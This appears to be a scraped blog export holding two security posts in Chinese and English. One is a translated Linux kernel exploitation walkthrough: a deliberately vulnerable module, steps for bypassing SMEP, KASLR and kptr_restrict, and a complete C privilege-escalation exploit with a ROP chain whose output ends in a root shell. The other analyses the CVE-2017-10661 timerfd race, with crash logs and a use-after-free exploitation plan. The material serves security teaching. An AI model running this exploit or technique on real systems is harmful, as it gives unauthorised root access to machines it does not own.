&lt;linux/slab.h&gt;static dev_t first; // Global variable for the first device number static struct cdev c_dev; // Global variable for the character device structure static struct class *cl; // Global variable for the device class static char *buffer_var;static int vuln_open(struct inode *i, struct file *f)&#123; printk(KERN_INFO \"[i] Module vuln: open()\\n\"); return 0;&#125;static int vuln_close(struct inode *i, struct file *f)&#123; printk(KERN_INFO \"[i] Module vuln: close()\\n\"); return 0;&#125;static ssize_t vuln_read(struct file *f, char __user *buf, size_t len, loff_t *off)&#123; if (strlen(buffer_var) &gt; 0) &#123; printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var); kfree(buffer_var); buffer_var = kmalloc(100, GFP_DMA); return 0; &#125; else &#123; return 1; &#125;&#125;static ssize_t vuln_write(struct file *f, const char __user *buf, size_t len, loff_t *off)&#123; char buffer[100] = &#123; 0 &#125;; if (_copy_from_user(buffer, buf, len)) return -EFAULT; buffer[len - 1] = '\\0'; printk(\"[i] Module vuln write: %s\\n\", buffer); strncpy(buffer_var, buffer, len); return len;&#125;static struct file_operations pugs_fops =&#123; .owner = THIS_MODULE, .open = vuln_open, .release = vuln_close, .write = vuln_write, .read = vuln_read&#125;;static int __init vuln_init(void) /* Constructor */&#123; buffer_var = kmalloc(100, GFP_DMA); printk(KERN_INFO \"[i] Module vuln registered\"); if (alloc_chrdev_region(&amp;first, 0, 1, \"vuln\") &lt; 0) &#123; return -1; &#125; if ((cl = class_create(THIS_MODULE, \"chardrv\")) == NULL) &#123; unregister_chrdev_region(first, 1); return -1; &#125; if (device_create(cl, NULL, first, NULL, \"vuln\") == NULL) &#123; printk(KERN_INFO \"[i] Module vuln error\"); class_destroy(cl); unregister_chrdev_region(first, 1); return -1; &#125; cdev_init(&amp;c_dev, &amp;pugs_fops); if (cdev_add(&amp;c_dev, first, 1) == -1) &#123; device_destroy(cl, first); class_destroy(cl); unregister_chrdev_region(first, 1); return -1; &#125; printk(KERN_INFO \"[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\\n\", MAJOR(first), MINOR(first)); return 0;&#125;static void __exit vuln_exit(void) /* Destructor */&#123; unregister_chrdev_region(first, 3); printk(KERN_INFO \"Module vuln unregistered\");&#125;module_init(vuln_init);module_exit(vuln_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"blackndoor\");MODULE_DESCRIPTION(\"Module vuln overflow\"); This really simple kernel module has a stack overflow in its function vuln_write( ) The datas’s lenght copied to the buffer variable isn’t checked这个非常简单的内核模块在其函数vuln_write中存在栈溢出，未检查复制到缓冲区变量的数据长度 Analyse123456789101112131415161718192021222324252627~$ lsmodkmod 16384 0 - Live 0x0000000000000000 (O) &lt;= kptr_restrict~$ ls / devconsole null ttyS0 vuln~$ cat / proc / kallsyms | grep commit_creds0000000000000000 T commit_creds &lt;= kptr_restrict~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln[28.965579] general protection fault : 0000[#1] SMP[28.967297] Modules linked in : kmod(O)[28.968139] CPU : 0 PID : 109 Comm : sh Tainted : G O 4.8.0 #5[28.968139] Hardware name : QEMU Standard PC(i440FX + PIIX, 1996), BIOS Ubuntu - 1.8.2 - 1ubuntu1 04 / 01 / 2014[28.968139] task : ffff9f1fc2730000 task.stack : ffff9f1fc2770000[28.968139] RIP : 0010 : [&lt; 4242424242424242&gt;] [&lt; 4242424242424242&gt;] 0x4242424242424242...[28.968139] CR2 : 0000000000494b0a CR3 : 000000000272f000 CR4 : 00000000001006f0 &lt;= SMEP...[28.968139] Call Trace :[28.968139] [&lt; ffffffffbb0c2a00&gt;] ? __init_waitqueue_head + 0x10 / 0x20...(restarted)~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln[112.990843] general protection fault : 0000[#1] SMP...[112.992198] Call Trace :[112.992198] [&lt; ffffffffba0c2a00&gt;] ? __init_waitqueue_head + 0x10 / 0x20 &lt;= KASLR In this analyse，we clearly see the protections（SMEP，KASLR and kptr_restrict）在这个分析中，我们清晰看到 Bypass SMEPAs explained before, SMEP doens’t allow the user space code to be executed by the kernel,so even if we control RIP，we can’t execute the user code right away：we can use a ROP explooit with kernel space addresses only or we can disable the SMEP’ bit如前所述，SMEP不允许内核执行用户空间代码，所以即使我们控制RIP也是如此，我们不能立即执行用户代码：我们只能使用带有内核空间地址的ROP攻击，或者可以禁用SMEP位SMEP is the 20th bit of the CR4 register which in our case is equal to：00000000000006f0SMEP是CR4寄存器的第20位，我们这里的情况等于 CR4：00000000001006f0 If we can get CR4 to be equal to：CR4：00000000000006f0 如果我们可以得到CR4等于：CR4：00000000000006f0 SMEP will be disabled.（SMEP将被禁用）To do so，we can use two gadgets：为此，我们可以使用两个gadgets12POP RDI；RET //place 00000000000006f0 in RDIMOV CR4，RDI；RET // SMEP disabled! Bypass KASLR and kptr_restrictThe goal of these bypasses is to find a kernel space address,and add to it an offset to retrieve the gadgets/address needed.We found one usefull address in the result of the dmesg command:这些绕过的目标是找到一个内核空间地址，并添加一个偏移量来检索所需要的gadgets/address。我们在dmesg命令的结果中找到了一个有用的地址：1234567891011121314~$ dmesg[0.000000] Linux version 4.8.0 (root@pc1001) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0 - 6ubuntu1~16.04.2)) #5 SMP Sat Oct 8 10:01 : 18 CEST 2016[0.000000] Command line : console = ttyS0 loglevel = 3 oops = panic panic = 1[0.000000] KERNEL supported cpus :[0.000000] Intel GenuineIntel[0.000000] AMD AuthenticAMD[0.000000] Centaur CentaurHauls[0.000000] x86 / fpu : Legacy x87 FPU detected.[0.000000] x86 / fpu : Using 'eager' FPU context switches.[0.000000] e820 : BIOS - provided physical RAM map :[0.000000] BIOS - e820 : [mem 0x0000000000000000 - 0x000000000009fbff] usable...[0.221392] Freeing SMP alternatives memory : 24K(ffffffffafea9000 - ffffffffafeaf000)... This is good but we still need to find offsets that we will add or substract to the address we found in order to get gadgets(for instance”pop gadget” or commit_creds address).这很好，但我们仍然需要找到offset 我们将添加或减去我们找到的地址以获取gadgets（例如”pop gadget”或commit_creds address）。We need to find the same kernel as the one used in the exercice with KASLR OFF and kptr_restrict set to 0，to be able to find our offsets.我们需要找到一些内核，如和练习中KASLR OFF和kptr_restrict设置为0一样的那种，以便我们能够找到偏移量 For this purpose，let’s first see the kernel used by the system：为此，我们先看看系统使用的内核12~$ uname - aLinux(none) 4.8.0 #5 SMP Sat Oct 8 10:01 : 18 CEST 2016 x86_ 64 GNU/Linux We download the kernel 4.8.0 from kernel.org and compile it with KASLR OFF.我们从kernel.org下载内核4.8.0并使用KASLR OFF进行编译。Then，we disable kptr_restric which is set in the “init” file. To do so we extract the file’s structure from initramfs.img然后 我们禁用在’init’文件中设置的kptr_restric。为此，我们从initramfs.img中提取文件的结构gzip -dcS .img initramfs.img | cpio -id We comment the 13th line:我们注意第13行1234567891011121314151617#!/bin/shchown root:root /root chown root:root /root/* chmod 600 /root/flag mknod -m 0666 /dev/null c 1 3 mknod -m 0660 /dev/ttyS0 c 4 64mount -t proc proc /proc mount -t sysfs sysfs /sys# restriction kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrict &lt;= comment this line insmod /kmod.ko mknod /dev/vuln c 247 0 chmod a+rw /dev/vulnsetsid cttyhack setuidgid 1000 shumount /proc umount /syspoweroff -f and we recreate the file’s structure：我们重新创建文件的结构：1find . | cpio -H newc -o | gzip &gt; ../initramfs.img We can now extract gadgets with ROPgadget:我们现在可以使用ROPgadget提取gadget：1234~$ ROPgadget --binary bzImage_KASLROFF | grep \"pop rdi ; ret\"...0xffffffff810b33bd : pop rdi; ret... With the same kernel，we collect usefull addresses such as：使用相同的内核，我们收集有用的地址 如：12commit_creds：ffffffff810a1cf0prepare_kernel_cred：ffffffff810a2060 The offset for the gadget “pop rdi” isgadget(pop rdi)的偏移量为：1\"pop RDI ret\" - prepare_kernel_creds = 0x1135d The offset was found with the kernel KASLR OFF，let’s see if the offset is different with the kernel KASLR ON：在内核KASLR OFF中找到偏移量，让我们看看偏移量是否与内核KASLR ON不同：1234567891011~$ cat /proc/kallsyms | grep prepare_kernel_credffffffffb90a21c0 T prepare_kernel_cred...~$ cat /proc/kallsyms | grep commit_credsffffffffb90a1e50 T commit_creds...(in another terminal)...(gdb)x / 2i ffffffffb90a21c0 + 0x1135d0xffffffffb90b351d: pop rdi0xffffffffb90b351e : ret We can do the same to retrieve other gadgets such as：（我们也可以做同样的检索其他gadget，如：）123movswapgsiretq Continuing with the kernel KASLR ON,we calculate the offset between the usefull address found in dmesg and prepare_kernel_cred/commit_creds:继续内核KASLR ON，我们计算在dmesg和prepare_kernel_cred/commit_creds中找到的有用地址之间的偏移量123456~$ dmesg...[0.208567] Freeing SMP alternatives memory : 24K(ffffffffb9ea9000 - ffffffffb9eaf000)... ffffffffb9ea9000 - ffffffffb90a1e50 = e071b0 =&gt; commit_creds_offset ffffffffb9ea9000 - ffffffffb90a21c0 = e06e40 =&gt; prepare_kernel_cred_offset We now have everythings to exploit，so we can set back the kptr_restric protection我们现在有许多东西可以利用，所以可以设置kptr_restric保护 ExploitThe Exploit is simple： （这个利用很简单） 1.execute dmesg （执行dmesg） 2.find the usefull address （找到有用的地址） 3.prepare the payload （准备有效载荷） 4.trigger the vulnerablity （触发漏洞） The payload has the following content：（有效载荷具有以下内容）1234567offset before RIPPOP RDI；RETMOV CR4，RDI；RETcommit_creds(prepare_kernel_cred(0))swapgsiretqsafe strucure Here is the final exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;sys/mman.h&gt;#include &lt;assert.h&gt;struct cred;struct task_struct;typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));typedef int(*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));prepare_kernel_cred_t prepare_kernel_cred;commit_creds_t commit_creds;unsigned long user_cs;unsigned long user_ss;unsigned long user_rflags;unsigned long stack;/*this function is needed to backup userland envthese values are necessary just after the iretq calls*/static void save_state() &#123; asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"pushfq\\n\" \"popq %2\\n\" : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\");&#125;/* function to get root id */void getroot(void)&#123; commit_creds(prepare_kernel_cred(0));&#125;/*this function checks if we got the root id and pops a shell if we didthe memory address of the function is placed in the ROP*/void shell(void) &#123; printf(\"[+] getuid() ...\"); if (!getuid()) &#123; printf(\" [root]\\n[+] Enjoy your shell...\\n\"); system(\"/bin/sh\"); &#125; else &#123; printf(\"[+] not root\\n[+] failed !!!\\n\"); &#125;&#125;/*This function tries to find the usefull addr needed for the expoit*/unsigned long findAddr() &#123; char line[512]; char string[] = \"Freeing SMP alternatives memory: 24K\"; char found[17]; unsigned long addr = 0; FILE* file = fopen(\"/tmp/dmesg\", \"r\"); while (fgets(line, sizeof(line), file)) &#123; if (strstr(line, string)) &#123; strncpy(found, line + 53, 16); sscanf(found, \"%p\", (void **)&amp;addr); break; &#125; &#125; fclose(file); if (addr == 0) &#123; printf(\" dmesg error...\\n\"); exit(1); &#125; return addr;&#125;int main(int argc, char *argv[])&#123; int fd; unsigned char payload[237] = &#123; 0 &#125;; unsigned char *p = payload; unsigned long memOffset; /* execute dmesg and place result in a file */ printf(\"[+] Excecute dmesg...\\n\"); system(\"dmesg &gt; /tmp/dmesg\"); /* find: Freeing SMP alternatives memory */ printf(\"[+] Find usefull addr...\\n\"); memOffset = findAddr(); printf(\" addr[0x%llx]\\n\", memOffset); /* set value for commit_creds and prepare_kernel_cred */ commit_creds = (commit_creds_t)(memOffset - 0xe071b0); prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xe06e40); /* open fd on /dev/vuln */ printf(\"[+] Open vuln device...\\n\"); if ((fd = open(\"/dev/vuln\", O_RDWR)) &lt; 0) &#123; printf(\" Can't open device file: /dev/vuln\\n\"); exit(1); &#125; /* payload */ printf(\"[+] Construct the payload...\\n\"); save_state(); /* offset before RIP */ memcpy(p, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", 116); p += 116; /* pop rdi ; ret */ unsigned long poprdi = (unsigned long)prepare_kernel_cred + 0x1135d; memcpy(p, &amp;poprdi, 8); printf(\" pop RDI at 0x%lx\\n\", poprdi); p += 8; memcpy(p, \"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\", 8); /* SMEP OFF */ p += 8; /* mov cr4, rdi ; pop rbp ; ret */ unsigned long movcr4 = (unsigned long)prepare_kernel_cred - 0x86880; memcpy(p, &amp;movcr4, 8); printf(\" mov CR4, RDI at 0x%lx\\n\", movcr4); p += 8; memcpy(p, \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\", 8); /* for rbp */ p += 8; /* getroot */ unsigned long gr = (unsigned long)getroot; memcpy(p, &amp;gr, 8); p += 8; /* swapgs; pop rbp; ret */ unsigned long swapgs = (unsigned long)prepare_kernel_cred - 0x3dfbc; printf(\" swapgs at 0x%lx\\n\", swapgs); memcpy(p, &amp;swapgs, 8); p += 8; memcpy(p, \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\", 8); /* for rbp */ p += 8; /* iretq */ unsigned long iretq = (unsigned long)prepare_kernel_cred - 0x61066; printf(\" iretq at 0x%lx\\n\", iretq); memcpy(p, &amp;iretq, 8); p += 8; /* the stack should look like this after an iretq call RIP CS EFLAGS RSP SS */ /* shell */ unsigned long sh = (unsigned long)shell; memcpy(p, &amp;sh, 8); p += 8; /* user_cs */ memcpy(p, &amp;user_cs, 8); p += 8; /* user_rflags */ memcpy(p, &amp;user_rflags, 8); p += 8; /* stack of userspace */ register unsigned long rsp asm(\"rsp\"); unsigned long sp = (unsigned long)rsp; memcpy(p, &amp;sp, 8); p += 8; /* user_ss */ memcpy(p, &amp;user_ss, 8); /* trig the vuln */ printf(\"[+] Trig the vulnerablity...\\n\"); write(fd, payload, 221); return 0;&#125; Can I get root please:12345678910111213141516171819202122~$ whoamiblackbunny~$ cat /proc/kallsyms | grep commit_creds0000000000000000 T commit_creds0000000000000000 R __ksymtab_commit_creds0000000000000000 r __kcrctab_commit_creds0000000000000000 r __kstrtab_commit_creds~$ /tmp/exploit[+] Excecute dmesg...[+] Find usefull addr...addr[0xffffffffbeea9000][+] Open vuln device...[+] Construct the payload...pop RDI at 0xffffffffbe0b351dmov CR4, RDI at 0xffffffffbe01b940swapgs at 0xffffffffbe064204iretq at 0xffffffffbe04115a[+] Trig the vulnerablity...[+] getuid() ...[root][+] Enjoy your shell...~# whoamiroot 原文:http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Exploit","slug":"Exploit","permalink":"http://github.com/tags/Exploit/"}]},{"title":"CVE-2017-10661","slug":"CVE-2017-10661","date":"2017-12-29T05:06:09.000Z","updated":"2019-03-30T10:06:07.724Z","comments":true,"path":"2017/12/29/CVE-2017-10661/","link":"","permalink":"http://github.com/2017/12/29/CVE-2017-10661/","excerpt":"","text":"CVE-2018-10661 前言测试内核测试时使用的linux内核是MI 5C的内核(3.10.58-03548-gc670b5a) 漏洞描述在4.10.15之前的linux内核中fs/timerfd.c中存在条件竞争漏洞,允许本地用户通过使用不合适的might_cancel列表的文件描述符操作获取特权或导致拒绝服务(list corruption or use-after-free) Google修复链接https://android.googlesource.com/kernel/goldfish/+/95cb006041c2f53060f4decffc7ef27f60aa1d39 存在漏洞的Nexus内核版本Nexus 6P :Linux version 3.10.73-geac7d674 (android-build@wpef26.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Tue Dec 13 10:11:12 UTC 2016Nexus 5X :Linux version 3.10.73-gf97f123 (android-build@wpiu4.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Nov 2 20:10:58 UTC 2015 漏洞复现红米4A_崩溃日志[ 259.810287] Unable to handle kernel paging request at virtual address dead000000000200 [ 259.810331] pgd = ffffffc06b967000 [ 259.810339] [dead000000000200] *pgd=00000000a1fb1003, *pud=00000000a1fb1003, *pmd=0000000000000000 [ 259.810360] Internal error: Oops: 96000044 [#1] PREEMPT SMP [ 259.810367] Modules linked in: wlan(O) [ 259.810386] CPU: 2 PID: 6022 Comm: main Tainted: G W O 3.18.24-perf-gdcca0a6 #1 [ 259.810394] Hardware name: Qualcomm Technologies, Inc. MSM8917-PMI8937 QRD SKU5 (DT) [ 259.810403] task: ffffffc053611900 ti: ffffffc035e48000 task.ti: ffffffc035e48000 [ 259.810418] PC is at do_timerfd_settime+0x124/0x384 [ 259.810427] LR is at do_timerfd_settime+0x118/0x384 [ 259.810435] pc : [&lt;ffffffc0001eb300&gt;] lr : [&lt;ffffffc0001eb2f4&gt;] pstate: 80000145 [ 259.810442] sp : ffffffc035e4bdd0 [ 259.810448] x29: ffffffc035e4bdd0 x28: ffffffc035e48000 [ 259.810461] x27: ffffffc035e4bea8 x26: 0000000000000056 [ 259.810474] x25: ffffffc0111f3300 x24: ffffffc0111f3301 [ 259.810486] x23: 0000000000000001 x22: ffffffc035e4be88 [ 259.810498] x21: 0000000000000000 x20: ffffffc0015ebb90 [ 259.810511] x19: ffffffc0111f3b00 x18: 0000000000000000 [ 259.810523] x17: 0000000000000001 x16: ffffffc0001ebb54 [ 259.810535] x15: 0000007f995ff838 x14: 000000002b63a2d4 [ 259.810547] x13: ffffffffa5cce430 x12: 0000000000000000 [ 259.810559] x11: 00000000041cdaeb x10: 00000000000f4240 [ 259.810571] x9 : 00000000000003e8 x8 : 0000000000000056 [ 259.810583] x7 : 0000000000000000 x6 : 0000010624dd2fb8 [ 259.810594] x5 : 0000000000000000 x4 : ffffffc035e4bda0 [ 259.810606] x3 : 0000000000000000 x2 : 0000000000000000 [ 259.810617] x1 : ffffffc0111f3be0 x0 : dead000000000200 ... [ 259.812135] [ 259.812143] Process main (pid: 6022, stack limit = 0xffffffc035e48058) [ 259.812149] Call trace: [ 259.812160] [&lt;ffffffc0001eb300&gt;] do_timerfd_settime+0x124/0x384 [ 259.812170] [&lt;ffffffc0001ebbe0&gt;] SyS_timerfd_settime+0x8c/0x108 [ 259.812181] Code: 9429cf30 f9407261 f9407660 f9000420 (f9000001) [ 259.812295] ---[ end trace 10b0993cfa7a40d0 ]--- [ 259.874037] Kernel panic - not syncing: Fatal exception [ 259.874050] CPU3: stopping MI 5C崩溃日志[ 72.679105] Unable to handle kernel paging request at virtual address 00200200 [ 72.679130] pgd = ffffffc03603a000 [ 72.679136] [00200200] *pgd=0000000054a8a003, *pmd=0000000000000000 [ 72.679152] Internal error: Oops: 96000046 [#1] PREEMPT SMP [ 72.679159] Modules linked in: [ 72.679172] CPU: 5 PID: 3907 Comm: main Not tainted 3.10.58-03548-gc670b5a #1 [ 72.679179] task: ffffffc006d18b00 ti: ffffffc030464000 task.ti: ffffffc030464000 [ 72.679198] PC is at do_timerfd_settime+0x13c/0x384 [ 72.679204] LR is at do_timerfd_settime+0x124/0x384 [ 72.679210] pc : [&lt;ffffffc0001fe99c&gt;] lr : [&lt;ffffffc0001fe984&gt;] pstate: 80000145 [ 72.679215] sp : ffffffc030467dc0 [ 72.679220] x29: ffffffc030467dc0 x28: ffffffc030464000 [ 72.679230] x27: ffffffc000e2e000 x26: ffffffc030467eb0 [ 72.679239] x25: 0000000000000001 x24: ffffffc04ab4c200 [ 72.679249] x23: 0000000000000000 x22: 0000000000000001 [ 72.679258] x21: ffffffc030467e90 x20: ffffffc0010fa350 [ 72.679268] x19: ffffffc04ab4d700 x18: 0000000000000000 [ 72.679277] x17: 0000000000000001 x16: ffffffc0001ff204 [ 72.679286] x15: 00000073aacff838 x14: 00000000322852a5 [ 72.679297] x13: ffffffffa5cce228 x12: 0000000000000000 [ 72.679306] x11: 000000002d2614c5 x10: 00000000000f4240 [ 72.679315] x9 : 00000000000003e8 x8 : 0000000000000056 [ 72.679325] x7 : 0000000000000000 x6 : 0000010624dd2fb8 [ 72.679334] x5 : 0000000000000000 x4 : 0000000000000003 [ 72.679344] x3 : ffffffc04ab4d7c0 x2 : 0000000000200200 [ 72.679353] x1 : 0000000000200200 x0 : ffffffc0010fa350 ... [ 72.679516] Call trace: [ 72.679524] [&lt;ffffffc0001fe99c&gt;] do_timerfd_settime+0x13c/0x384 [ 72.679532] [&lt;ffffffc0001ff284&gt;] SyS_timerfd_settime+0x80/0x100 [ 72.679539] Code: f9406662 f2a00401 aa1403e0 f9000462 (f9000043) [ 72.679588] ---[ end trace 4bf3b843607c1053 ]--- [ 72.704005] Kernel panic - not syncing: Fatal exception [ 72.704028] CPU4: stopping 我们通过分析不同手机的内核崩溃日志可以看到是存在两种不同崩溃的，这取决于当前内核的LIST_POISON2宏的值（0xdead000000200200 或 0x00200200）当LIST_POISON2等于0xdead000000200200因为无法使用mmap对其进行映射，导致触发漏洞时会稳定崩溃在对该地址进行写入的位置，没想到如何避免该崩溃，而当LIST_POISON2等与0x00200200时我们可以通过mmap函数在exploit程序中对其进行映射，当触发漏洞的时候也就不会造成内核崩溃，也就可以进行我们下一步的利用操作，以下的操作都是基于LIST_POISON2等于0x00200200 漏洞成因首先看下官方给的补丁左边属于打补丁之前的代码，右边属于打补丁之后的代码可以看到主要是新添加了一个__timerfd_remove_cancel函数，该函数是在对timerfd_remove_cancel函数做调用的时候进行锁操作，在timerfd_setup_cancel函数中也加了锁操作，所以我们着重分析没打补丁之前的timerfd_setup_canceled函数和timerfd_remove_cancel函数123456789101112131415static void timerfd_setup_cancel(struct timerfd_ctx *ctx, int flags)&#123; if ((ctx-&gt;clockid == CLOCK_REALTIME || ctx-&gt;clockid == CLOCK_REALTIME_ALARM) &amp;&amp; (flags &amp; TFD_TIMER_ABSTIME) &amp;&amp; (flags &amp; TFD_TIMER_CANCEL_ON_SET)) &#123; if (!ctx-&gt;might_cancel) &#123; ctx-&gt;might_cancel = true; spin_lock(&amp;cancel_lock); list_add_rcu(&amp;ctx-&gt;clist, &amp;cancel_list); /* 对ctx-&gt;clist做添加操作 */ spin_unlock(&amp;cancel_lock); &#125; &#125; else if (ctx-&gt;might_cancel) &#123; timerfd_remove_cancel(ctx); /* 对ctx-&gt;clist做删除操作 */ &#125;&#125; 1234static inline void list_add_rcu(struct list_head *new, struct list_head *head)&#123; __list_add_rcu(new, head, head-&gt;next);&#125; 123456789static void timerfd_remove_cancel(struct timerfd_ctx *ctx)&#123; if (ctx-&gt;might_cancel) &#123; ctx-&gt;might_cancel = false; spin_lock(&amp;cancel_lock); list_del_rcu(&amp;ctx-&gt;clist); /* 对ctx-&gt;clist做删除操作*/ spin_unlock(&amp;cancel_lock); &#125;&#125; 12345static inline void list_del_rcu(struct list_head *entry)&#123; __list_del_entry(entry); entry-&gt;prev = LIST_POISON2;&#125; 首先来熟悉下timerfd_setup_cancel函数的逻辑,该函数存在两条分支,而这两条分支又都是通过判断ctx-&gt;might_cancel变量的值来控制应该执行哪条分支 1.ctx-&gt;might_cancel == false, call -&gt; list_add_rcu函数 2.ctx-&gt;might_cancel == true, call -&gt; timerfd_remove_cancel函数 第一次调用timerfd_setup_cancel函数时,当ctx-&gt;might_cancel等于false的时候,内核会走分支1,然后把ctx-&gt;might_cancel设置为true,然后调用list_add_rcu函数对cancel_list进行添加操作。再次调用timerfd_setup_cancel函数的时候,因为第一次已经把ctx-&gt;might_cancel设置为true了,所以会进入分支2执行,然后调用timerfd_remove_cancel函数,把ctx-&gt;might_cancel设置为false,并且调用list_del_rcu函数对cancel_list进行删除操作。 弄清楚该函数逻辑后再回头看看补丁,也就明白为什么官方要增加两个锁操作了,猜测是因为这里的ctx-&gt;might_cancel在没打补丁之前是允许被别的进程修改的,一加一减本来是没什么问题,如果是单线程对timerfd_setup_cancel函数做调用的话,但是如果是两个线程或多个线程同时调用timerfd_setup_cancel函数那么会怎么样呢?可能就会出现线程同步问题,存在下面3种情况。为什么说两个不同的线程修改的会是同一个ctx结构体呢?那么我们可以先来看看ctx这个变量是怎么来的,在系统调用timerfd_create处可以看到ctx是在我们创建计时器对象时申请的,ctx在timerfd_create函数中被创建后,后续函数中的ctx都是以结构体指针(struct timerfd_ctx *)的方式对最开始创建的ctx进行访问,也就是说每个函数中操作的ctx-&gt;might_cancel其实也都是同一个变量,这也证明我们之前的猜测是没毛病的,这样的话我们完全可以创建多个线程与主线程做竞争改变ctx-&gt;might_cancel变量的值。1234567891011121314151617181920212223242526272829303132333435363738SYSCALL_DEFINE2(timerfd_create, int, clockid, int, flags)&#123; int ufd; struct timerfd_ctx *ctx; enum alarmtimer_type type; /* Check the TFD_* constants for consistency. */ BUILD_BUG_ON(TFD_CLOEXEC != O_CLOEXEC); BUILD_BUG_ON(TFD_NONBLOCK != O_NONBLOCK); if ((flags &amp; ~TFD_CREATE_FLAGS) || (clockid != CLOCK_MONOTONIC &amp;&amp; clockid != CLOCK_REALTIME &amp;&amp; clockid != CLOCK_REALTIME_ALARM &amp;&amp; clockid != CLOCK_BOOTTIME &amp;&amp; clockid != CLOCK_BOOTTIME_ALARM &amp;&amp; clockid != CLOCK_POWEROFF_ALARM)) return -EINVAL; ctx = kzalloc(sizeof(*ctx), GFP_KERNEL); /* ctx在此处被创建,并会被用于后续的操作 */ if (!ctx) return -ENOMEM; init_waitqueue_head(&amp;ctx-&gt;wqh); ctx-&gt;clockid = clockid; if (isalarm(ctx)) &#123; type = clock2alarm(ctx-&gt;clockid); alarm_init(&amp;ctx-&gt;t.alarm, type, timerfd_alarmproc); &#125; else &#123; hrtimer_init(&amp;ctx-&gt;t.tmr, clockid, HRTIMER_MODE_ABS); &#125; ctx-&gt;moffs = ktime_mono_to_real((ktime_t)&#123; .tv64 = 0 &#125;); ufd = anon_inode_getfd(\"[timerfd]\", &amp;timerfd_fops, ctx, O_RDWR | (flags &amp; TFD_SHARED_FCNTL_FLAGS)); if (ufd &lt; 0) kfree(ctx); return ufd;&#125; 该漏洞属于多线程并行造成的条件竞争问题,从崩溃信息来看,我们触发的应该是第3种情况(对cancel_list做两次删除操作)。 第一次删除entry-&gt;prev被设置为了LIST_POISON2(0x00200200),因为属于正常删除,所以此时系统并没有崩溃, 第二次删除在__list_del_entry中取entry_prev指向地址(0x00200200)的值，因为0x00200200该地址未映射,导致访问异常，系统崩溃 因为两次删除的是同一个结构体,而第一次把结构体的entry_prev设置为了0x00200200,当第二次进行取值的时候就出现了访问异常。 漏洞利用ctx-&gt;clist增删调用链:用户层的系统调用timerfd_settime() timerfd_settime() ---&gt; 增加链 \\__do_timerfd_settime() \\__timerfd_setup_cancel() \\__list_add_rcu() timerfd_settime() ---&gt; 删除链 \\__do_timerfd_settime() \\__timerfd_setup_cancel() \\__timerfd_remove_cancel() \\__list_del_rcu() 利用思路我们可以把条件竞争漏洞进阶为Use_After_Free漏洞,也就是前面提到的3种情况中的第2种情况,该情况会对cancel_list添加两次,那时的ctx-&gt;prev == ctx-&gt;next,然后释放掉ctx-&gt;prev指向的内存—也就是节点本身,但是ctx-&gt;next却对该内存还存在引用,这就给了我们后面的利用思路。总体可分为6步: 第一步:调用timerfd_create()函数创建一个timerfd和分配ctx结构体内存 第二步:创建多个线程同时调用timerfd_settime函数,争取触发第2种竞争问题 第三步:调用close函数触发释放结构体内存kfree_rcu(ctx) --&gt; timerfd_release --&gt; timerfd_remove_cancel(ctx) 第四步:通过Heap spray技术对ctx结构体进行喷射,填充释放的ctx结构体 第五步:通过调用settimeofday函数,触发释放后重引用漏洞,从而控制”PC” 第六步:使用gadget对address_limit进行修改,并绕过PXN保护机制 12345678let_go_timerfd_setup_cancel list_add_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=200200,next=c5c9b388let_go_timerfd_setup_cancel list_add_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c049c244,next=c5c9b388let_go_timerfd_release &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c5c9b2c8,next=c5c9b2c8let_go_timerfd_remove_cancel list_del_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b240 prev=c5c9b2c8,next=c5c9b2c8 /*第一次删除,此时前后指针已经指向同一地址 0xc5c9b2c8*//*-----------------------------------喷射时机----------------------------------------------- ----*/结束时let_go_timerfd_release &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b300 prev=c5c9b2c8,next=c92891c8 let_go_timerfd_remove_cancel list_del_rcu &gt;&gt;&gt;&gt;&gt;&gt;&gt; ctx = c5c9b300 prev=c5c9b2c8,next=c92891c8 /*第二次删除*/ 